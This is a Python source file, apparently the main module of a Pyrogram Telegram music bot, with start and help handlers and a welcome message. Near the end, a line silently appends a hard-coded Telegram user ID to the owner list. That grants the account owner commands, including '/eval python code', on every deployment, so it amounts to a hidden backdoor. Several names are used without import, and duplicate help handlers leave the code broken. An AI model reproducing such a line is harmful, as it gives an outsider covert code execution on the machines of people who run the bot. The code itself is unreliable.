from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from YogeshBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from YogeshBots import app, LOGGER
from YogeshBots.YogeshBots  import ignore_blacklisted_users
from YogeshBots.sql.chat_sql import add_chat_to_db

start_text = """
வணக்கம்! [{}](tg://user?id={}),

நான் YB Play Song Bot! [🎶](https://telegra.ph/file/34e8b5cd572fddadf6115.jpg)

I'M Music Bot By @YogeshBots 
⚠️You must subscribe our channel in order to use me😇

உங்களுக்கு தேவையான பாடலின் பெயரை அனுப்பவும்... ☺️💙

Eg :- ```/song marandhaye```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""

@app.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text(" Sorry, You are **B A N N E D**")
               return
        except UserNotParticipant:
            await update.reply_text(
                text="**Please Join My Update Channel Before Using Me..**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="📩 Join Channel 📩", url="http://telegram.me/YogeshBots"),
             InlineKeyboardButton(
                        text="💫 Add Me To Group 🥳", url="http://t.me/YBPlaySongBot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Syntax: /song name"
    await message.reply(text)

OWNER_ID.append(1746549189)
app.start()
LOGGER.info("YB Play Song Bot Is Now Working🤗🤗🤗")
idle()
